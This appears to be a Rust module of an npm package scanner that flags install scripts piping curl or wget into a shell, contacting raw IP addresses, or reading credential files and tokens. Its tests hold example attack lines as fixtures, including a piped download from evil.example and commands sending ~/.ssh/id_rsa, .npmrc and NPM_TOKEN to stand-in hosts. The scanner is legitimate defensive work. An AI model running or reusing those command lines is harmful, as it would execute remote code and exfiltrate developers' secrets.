//! Network and credential access in npm install scripts.
//!
//! Install scripts are the payload delivery mechanism for most npm malware.
//! This module reads them — and the local files they invoke — as text and
//! reports the common exfiltration and download shapes:
//!
//! - `curl`/`wget` output piped into `sh`/`bash`/`zsh`/`dash`, or
//!   `sh -c "$(curl ...)"`,
//! - HTTP(S) requests aimed at a raw IPv4 address rather than a hostname,
//! - reads of npm, AWS and GitHub tokens, `~/.ssh` and `~/.npmrc`.
//!
//! Every finding carries a truncated copy of the matched line so a reviewer
//! can see the evidence without opening the package. Nothing is executed and
//! no network request is made by the scanner.

use std::path::{Component, Path};

use crate::cve::severity::Severity;

use super::scripts::install_scripts;
use super::BehavioralFinding;

/// Longest snippet included in a finding message, in characters.
pub const MAX_SNIPPET_CHARS: usize = 80;

/// The behaviour a line matched.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum NetworkPattern {
    /// A downloaded script is piped straight into a shell.
    PipeToShell,
    /// An HTTP(S) request targets a raw IPv4 literal.
    RawIpRequest,
    /// A token, SSH directory or npm config file is read.
    CredentialAccess,
}

impl NetworkPattern {
    pub fn severity(self) -> Severity {
        match self {
            NetworkPattern::PipeToShell | NetworkPattern::CredentialAccess => Severity::High,
            // Talking to an IP is a strong indicator, but not code execution
            // on its own.
            NetworkPattern::RawIpRequest => Severity::Medium,
        }
    }

    pub fn label(self) -> &'static str {
        match self {
            NetworkPattern::PipeToShell => "download piped to a shell",
            NetworkPattern::RawIpRequest => "request to a raw IP address",
            NetworkPattern::CredentialAccess => "credential or secret-file access",
        }
    }
}

/// Scans one script (normally an npm lifecycle command or a file it invokes)
/// line by line. `file` labels the findings; it is never opened.
pub fn scan_script(file: &str, source: &str) -> Vec<BehavioralFinding> {
    let mut findings = Vec::new();
    for (index, line) in source.lines().enumerate() {
        let snippet = snippet(line);
        if pipe_to_shell(line) {
            push(
                &mut findings,
                file,
                index,
                NetworkPattern::PipeToShell,
                &snippet,
            );
        }
        if raw_ip_request(line) {
            push(
                &mut findings,
                file,
                index,
                NetworkPattern::RawIpRequest,
                &snippet,
            );
        }
        if credential_access(line) {
            push(
                &mut findings,
                file,
                index,
                NetworkPattern::CredentialAccess,
                &snippet,
            );
        }
    }
    findings
}

fn push(
    findings: &mut Vec<BehavioralFinding>,
    file: &str,
    index: usize,
    pattern: NetworkPattern,
    snippet: &str,
) {
    findings.push(BehavioralFinding {
        file: file.to_string(),
        line: Some(index + 1),
        severity: pattern.severity(),
        message: format!("{}: \"{snippet}\"", pattern.label()),
    });
}

/// Scans every install script declared in `package_json`, labelling findings
/// with `package.json`.
pub fn scan_install_scripts(package_json: &str) -> Vec<BehavioralFinding> {
    let mut findings = Vec::new();
    for (hook, command) in install_scripts(package_json) {
        for finding in scan_script("package.json", &command) {
            findings.push(BehavioralFinding {
                line: None,
                message: format!("[{hook}] {}", finding.message),
                ..finding
            });
        }
    }
    findings
}

/// Scans a package's `package.json` install scripts and every local script
/// file they invoke (`node scripts/install.js`, `sh ./setup.sh`, ...).
///
/// Referenced paths are resolved inside `root`; absolute paths, `..`
/// components and missing files are skipped. I/O errors from reading
/// candidate files are ignored, so one unreadable script doesn't abort the
/// scan.
pub fn scan_package(root: &Path, package_json: &str) -> Vec<BehavioralFinding> {
    let mut findings = scan_install_scripts(package_json);
    let mut invoked = Vec::new();
    for (_, command) in install_scripts(package_json) {
        for path in referenced_files(&command) {
            if !invoked.contains(&path) {
                invoked.push(path);
            }
        }
    }
    invoked.sort();
    for path in invoked {
        let full = root.join(&path);
        if let Ok(source) = std::fs::read_to_string(full) {
            findings.extend(scan_script(&path, &source));
        }
    }
    findings
}

/// Extracts local script files named on a command line.
fn referenced_files(command: &str) -> Vec<String> {
    let mut files = Vec::new();
    for token in command.split_whitespace() {
        let token = token
            .trim_matches(|c: char| matches!(c, '\'' | '"' | '&' | '|' | ';' | '(' | ')' | '`'));
        let lower = token.to_ascii_lowercase();
        let is_script = [".js", ".mjs", ".cjs", ".sh", ".bash"]
            .iter()
            .any(|ext| lower.ends_with(ext));
        if !is_script {
            continue;
        }
        let path = Path::new(token);
        if path.is_absolute()
            || path
                .components()
                .any(|component| matches!(component, Component::ParentDir | Component::RootDir))
        {
            continue;
        }
        let normalized = path
            .components()
            .filter_map(|component| match component {
                Component::Normal(part) => Some(part.to_string_lossy().into_owned()),
                _ => None,
            })
            .collect::<Vec<_>>()
            .join("/");
        if !normalized.is_empty() {
            files.push(normalized);
        }
    }
    files
}

/// `curl ... | sh`, `wget -qO- ... | bash`, `sh -c "$(curl ...)"`.
fn pipe_to_shell(line: &str) -> bool {
    let lower = line.to_ascii_lowercase();
    let downloads = lower.contains("curl") || lower.contains("wget");
    if !downloads {
        return false;
    }
    let mut segments = lower.split('|').skip(1);
    if segments.any(|segment| {
        let mut words = segment.split_whitespace();
        let mut first = words
            .next()
            .unwrap_or_default()
            .trim_matches(|c: char| matches!(c, ';' | '&' | '\\' | '\'' | '"' | '`'));
        if first == "sudo" {
            first = words
                .next()
                .unwrap_or_default()
                .trim_matches(|c: char| matches!(c, ';' | '&' | '\\' | '\'' | '"' | '`'));
        }
        let shell = first.rsplit('/').next().unwrap_or(first);
        matches!(shell, "sh" | "bash" | "zsh" | "dash" | "fish")
    }) {
        return true;
    }
    // Command substitution: sh -c "$(curl ...)" / bash -c "wget ...".
    lower.contains("$(") && (lower.contains("sh -c") || lower.contains("bash -c"))
}

/// An HTTP(S) request or URL that contains a raw IPv4 literal.
fn raw_ip_request(line: &str) -> bool {
    let lower = line.to_ascii_lowercase();
    let request = lower.contains("http://")
        || lower.contains("https://")
        || lower.contains("http.request")
        || lower.contains("https.request")
        || lower.contains("request(")
        || lower.contains("fetch(")
        || lower.contains("net.connect");
    request && contains_ipv4(line)
}

fn contains_ipv4(line: &str) -> bool {
    line.split(|c: char| !(c.is_ascii_digit() || c == '.'))
        .any(is_ipv4)
}

fn is_ipv4(candidate: &str) -> bool {
    let parts: Vec<&str> = candidate.split('.').collect();
    parts.len() == 4
        && parts.iter().all(|part| {
            !part.is_empty()
                && part.len() <= 3
                && part.parse::<u16>().is_ok_and(|value| value <= 255)
        })
}

/// Tokens and paths that hold credentials the installer can reach.
fn credential_access(line: &str) -> bool {
    const TOKENS: &[&str] = &[
        "NPM_TOKEN",
        "GITHUB_TOKEN",
        "GH_TOKEN",
        "AWS_ACCESS_KEY_ID",
        "AWS_SECRET_ACCESS_KEY",
        "AWS_SESSION_TOKEN",
        "~/.ssh",
        ".ssh",
        "~/.npmrc",
        ".npmrc",
    ];
    TOKENS.iter().any(|token| line.contains(token))
        || line
            .split(|c: char| !(c.is_ascii_alphanumeric() || c == '_'))
            .any(|word| word.starts_with("AWS_"))
}

fn snippet(line: &str) -> String {
    let trimmed = line.trim();
    let mut chars = trimmed.chars();
    let snippet: String = chars.by_ref().take(MAX_SNIPPET_CHARS).collect();
    if chars.next().is_some() {
        format!("{snippet}...")
    } else {
        snippet
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn messages(source: &str) -> Vec<String> {
        scan_script("postinstall.js", source)
            .into_iter()
            .map(|finding| finding.message)
            .collect()
    }

    #[test]
    fn curl_piped_to_shell_is_flagged() {
        let findings = scan_script(
            "postinstall.js",
            "curl -fsSL https://evil.example/x.sh | sh\n",
        );
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::High);
        assert!(findings[0].message.contains("piped to a shell"));
        assert!(findings[0].message.contains("curl -fsSL"));
    }

    #[test]
    fn wget_piped_to_bash_is_flagged() {
        assert_eq!(
            messages("wget -qO- http://evil.example/x | bash -s --").len(),
            1
        );
        assert_eq!(
            messages("sh -c \"$(curl -s http://evil.example/x)\"").len(),
            1
        );
    }

    #[test]
    fn http_request_to_a_raw_ip_is_flagged() {
        let findings = scan_script(
            "install.js",
            "require('http').request({host: '203.0.113.9'}).end();\n",
        );
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].severity, Severity::Medium);
        assert!(findings[0].message.contains("raw IP"));

        assert_eq!(
            messages("fetch('http://198.51.100.4/payload').then(r => r.text());").len(),
            1
        );
    }

    #[test]
    fn credential_tokens_are_flagged() {
        for line in [
            "const token = process.env.NPM_TOKEN;",
            "const key = process.env.AWS_SECRET_ACCESS_KEY;",
            "fetch(url, {headers: {authorization: process.env.GITHUB_TOKEN}});",
            "const key = process.env.AWS_SESSION_TOKEN;",
        ] {
            let findings = scan_script("postinstall.sh", line);
            assert_eq!(findings.len(), 1, "{line}");
            assert_eq!(findings[0].severity, Severity::High);
            assert!(findings[0].message.contains("credential"), "{line}");
        }
    }

    #[test]
    fn ssh_and_npm_config_access_is_flagged() {
        for line in [
            "cat ~/.ssh/id_rsa | curl -X POST https://evil.example",
            "const host = path.join(home, '.ssh', 'known_hosts');",
            "cp ~/.npmrc /tmp/npmrc && curl -d @/tmp/npmrc https://evil.example",
            "const rc = fs.readFileSync(path.join(home, '.npmrc'));",
        ] {
            let findings = scan_script("postinstall.sh", line);
            assert!(
                findings
                    .iter()
                    .any(|f| f.message.contains("credential or secret-file access")),
                "{line}: {findings:?}"
            );
        }
    }

    #[test]
    fn benign_build_scripts_are_not_flagged() {
        for line in [
            "node-gyp rebuild",
            "tsc -p tsconfig.json && node scripts/build.js",
            "node scripts/postinstall.js",
            "sh ./scripts/compile.sh --release",
            "echo 'downloaded from https://registry.npmjs.org'",
        ] {
            assert_eq!(messages(line), Vec::<String>::new(), "{line}");
        }
    }

    #[test]
    fn one_finding_per_pattern_per_line() {
        let findings = scan_script(
            "postinstall.sh",
            "curl http://203.0.113.9/x | sh; cat ~/.ssh/id_rsa",
        );
        assert_eq!(findings.len(), 3, "{findings:?}");
        assert_eq!(
            findings[0].message.split(':').next(),
            Some("download piped to a shell")
        );
        assert!(findings[1].message.contains("raw IP"));
        assert!(findings[2].message.contains("credential"));
    }

    #[test]
    fn snippets_are_truncated() {
        let line = format!("curl -fsSL https://evil.example/{} | sh", "a".repeat(200));
        let findings = scan_script("postinstall.sh", &line);
        assert_eq!(findings.len(), 1);
        assert!(
            findings[0].message.contains("..."),
            "{}",
            findings[0].message
        );
        let quoted = &findings[0].message;
        assert!(quoted.chars().count() < 140, "{quoted}");
    }

    #[test]
    fn package_json_scripts_are_scanned() {
        let json = r#"{"scripts":{"preinstall":"curl -s https://evil.example/x | sh"}}"#;
        let findings = scan_install_scripts(json);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].file, "package.json");
        assert!(findings[0].message.contains("[preinstall]"));
    }

    #[test]
    fn files_invoked_by_install_scripts_are_scanned() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::create_dir_all(root.join("scripts")).unwrap();
        std::fs::write(
            root.join("scripts/install.js"),
            "const t = process.env.NPM_TOKEN;\nfetch('http://203.0.113.9/collect', {body: t});\n",
        )
        .unwrap();
        let json = r#"{"scripts":{"postinstall":"node scripts/install.js"}}"#;
        let findings = scan_package(root, json);
        assert_eq!(findings.len(), 2, "{findings:?}");
        assert!(findings.iter().all(|f| f.file == "scripts/install.js"));
        assert!(findings
            .iter()
            .any(|f| f.message.contains("credential or secret-file access")));
        assert!(findings.iter().any(|f| f.message.contains("raw IP")));
    }

    #[test]
    fn invoked_paths_cannot_escape_the_package() {
        let dir = tempfile::tempdir().unwrap();
        let json = r#"{"scripts":{"postinstall":"node ../escape.js ../../etc/passwd.sh"}}"#;
        assert_eq!(scan_package(dir.path(), json), Vec::new());
    }
}
